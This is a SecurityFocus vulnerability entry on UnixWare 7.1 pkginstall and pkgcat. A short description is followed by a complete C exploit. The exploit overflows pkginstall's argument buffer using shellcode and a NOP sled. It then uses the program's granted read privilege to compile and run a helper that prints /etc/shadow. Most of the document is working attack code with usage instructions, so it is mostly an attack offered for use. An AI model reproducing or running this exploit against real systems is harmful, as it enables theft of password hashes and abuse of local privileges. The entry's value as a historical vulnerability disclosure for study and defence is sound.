source: http://www.securityfocus.com/bid/853/info
 
It is possible to view the entries in /etc/shadow through exploiting a buffer overflow in pkgcat and pkginstall. Though neither of these binaries are setuid, the dacread permissions which are granted in /etc/security/tcb/privs give them the ability read /etc/shadow. When the oversized buffer data is passed to the programs as argv[1], the stack will be corrupted and it is possible to spawn a program which would "cat" /etc/shadow with the dacread privs.

/**
 ** UnixWare 7.1 /usr/sbin/pkginstall exploit 

 ** Prints contents of /etc/shadow (execing shell won't be enough here)
 ** Demonstrates overflow in uw71's gethostbyname() and dacread permissio=
n
 ** problems.  Use offsets of +-100.
 **
 ** Compile cc -o uwpkgi uwpkgi.c
 ** run /usr/sbin/pkginstall -s `./uwpkgi 100`:
 **
 ** Brock Tellier btellier@usa.net
 **/ 



#include <stdlib.h>
#include <stdio.h>

char scoshell[] = 

"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/tmp/pi\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

                       

#define LEN 3500
#define NOP 0x90
#define CODE "void main() { system(\"cat /etc/shadow\"); }\n"

void buildpi() {
  FILE *fp;
  char cc[100];

  fp = fopen("/tmp/pi.c", "w");
  fprintf(fp, CODE);
  fclose(fp);
  snprintf(cc, sizeof(cc), "cc -o /tmp/pi /tmp/pi.c");
  system(cc);

}

int main(int argc, char *argv[]) {

long int offset=0;

int i;
int buflen = LEN;
long int addr;
char buf[LEN];
buildpi(); 

 if(argc > 3) {
  fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
        exit(0); 

 }
 else if (argc == 2){
   offset=atoi(argv[1]);
   
 }
 else if (argc == 3) {
  offset=atoi(argv[1]);
  buflen=atoi(argv[2]); =

 }
 else {
   offset=100;
   buflen=3000;

 }

addr=0x8046b75 + offset;

fprintf(stderr, "\nUnixWare 7.1 pkginstall exploit prints");
fprintf(stderr, "/etc/shadow\n");
fprintf(stderr, "Brock Tellier btellier@usa.net\n\n");
fprintf(stderr, "Using addr: 0x%x\n", addr+offset);

memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),scoshell,strlen(scoshell));
for(i=((buflen/2) + strlen(scoshell))+2;i<buflen-4;i+=4)
        *(int *)&buf[i]=addr;
buf[buflen - 1] = ':';

printf(buf);
exit(0);
}
